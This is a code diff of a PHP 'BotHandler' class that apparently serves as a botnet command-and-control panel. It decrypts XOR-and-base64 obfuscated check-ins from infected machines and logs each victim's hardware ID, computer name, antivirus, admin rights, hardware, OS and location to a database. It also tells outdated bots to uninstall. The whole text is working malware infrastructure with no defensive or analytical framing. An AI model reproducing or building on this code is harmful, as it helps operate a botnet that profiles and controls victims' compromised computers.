@@ -34,7 +34,7 @@ class BotHandler
 
         if (!empty($_POST["botversion"])) {
             //Old version
-            die();
+            die("uninstall");
         }
 
         //  var_dump($_POST);
@@ -47,12 +47,17 @@ class BotHandler
 
         //echo $_POST["taskid"];
 
+        //ToDO
+        //$_SERVER['HTTP_USER_AGENT']
+
         //Decrypt Main Requests
         if (!empty($_POST["request"])) {
 
             $signal = base64_decode($this->xor_this(base64_decode($_POST["request"])));
 
             parse_str($signal, $postbot);
+
+
 
             $botfound = false;
             $bot = "";
@@ -177,42 +182,48 @@ class BotHandler
                 }
 
             } else {
-                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                if (!empty($postbot["antivirus"])) {
-                    $avcheck = base64_decode($postbot["antivirus"]);
-                } else {
-                    $avcheck = "none";
+
+
+                if(!empty($postbot["hwid"]) && !empty($postbot["computername"]) && !empty($postbot["botversion"])){
+                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO bots (antivirus, hwid, computrername, country, netframework2, netframework3, netframework35, netframework4, latitude, longitude, countryName, ram, gpu, cpu, isadmin, architecture, ip, operingsystem, version) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                    if (!empty($postbot["antivirus"])) {
+                        $avcheck = base64_decode($postbot["antivirus"]);
+                    } else {
+                        $avcheck = "none";
+                    }
+
+
+                    $statement->execute(array(
+                        $avcheck,
+                        $postbot["hwid"],
+                        $postbot["computername"],
+                        $country,
+                        $postbot["netFramework2"],
+                        $postbot["netFramework3"],
+                        $postbot["netFramework35"],
+                        $postbot["netFramework4"],
+                        $countryLatitude,
+                        $countryLongitude,
+                        $countryName,
+                        $postbot["installedRam"],
+                        base64_decode($postbot["gpuName"]),
+                        base64_decode($postbot["cpuName"]),
+                        $postbot["aornot"],
+                        base64_decode($postbot["arch"]),
+                        $ip,
+                        base64_decode($postbot["operingsystem"]),
+                        $postbot["botversion"]
+                    ));
                 }
 
 
-                $statement->execute(array(
-                    $avcheck,
-                    $postbot["hwid"],
-                    $postbot["computername"],
-                    $country,
-                    $postbot["netFramework2"],
-                    $postbot["netFramework3"],
-                    $postbot["netFramework35"],
-                    $postbot["netFramework4"],
-                    $countryLatitude,
-                    $countryLongitude,
-                    $countryName,
-                    $postbot["installedRam"],
-                    base64_decode($postbot["gpuName"]),
-                    base64_decode($postbot["cpuName"]),
-                    $postbot["aornot"],
-                    base64_decode($postbot["arch"]),
-                    $ip,
-                    base64_decode($postbot["operingsystem"]),
-                    $postbot["botversion"]
-                ));
             }
-            echo "waiting";
-            die();
+            //echo "waiting";
+            //die();
         }
 
 
-        die();
+        //die();
 
 
     }
